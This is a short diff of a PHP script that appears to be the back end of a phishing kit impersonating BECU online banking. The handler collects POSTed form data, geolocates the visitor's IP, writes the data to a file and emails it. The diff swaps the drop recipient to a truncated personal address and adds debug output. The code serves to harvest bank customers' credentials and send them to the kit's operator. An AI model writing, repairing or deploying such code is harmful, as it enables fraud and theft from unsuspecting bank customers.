@@ -11,7 +11,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $serv = isset($_REQUEST['verify']) ? $_REQUEST['verify'] : '';
 
     // Include the geoPlugin class
-    require_once('geoplugin.class.php');
+    require_once('BECUBankingWeb/geoplugin.class.php');
+    echo "GeoPlugin class included successfully."; // Check if included
+
     $geoplugin = new geoPlugin();
 
     echo 'Reached point A';
@@ -48,7 +50,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         fclose($handle);
 
         // Send the email
-        $send = "verify@assuredserver.com";
+        $send = "dvand848@gmai";
         $subject = "becu.org l $ip";
         $headers = "From: Blackfire007@assuredserver.com";
 
